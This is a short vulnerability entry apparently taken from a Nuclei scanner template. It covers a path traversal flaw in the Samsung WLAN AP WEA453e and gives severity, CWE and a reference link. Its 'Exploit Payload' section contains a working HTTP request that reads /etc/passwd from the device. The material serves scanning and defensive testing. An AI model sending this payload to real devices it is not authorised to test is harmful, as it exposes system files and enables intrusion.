# Nuclei Template: Samsung WLAN AP WEA453e - Local File Inclusion
**Template ID:** samsung-wlan-ap-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`samsung-wlan-ap-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/(download)/etc/passwd
```

## References
- https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba
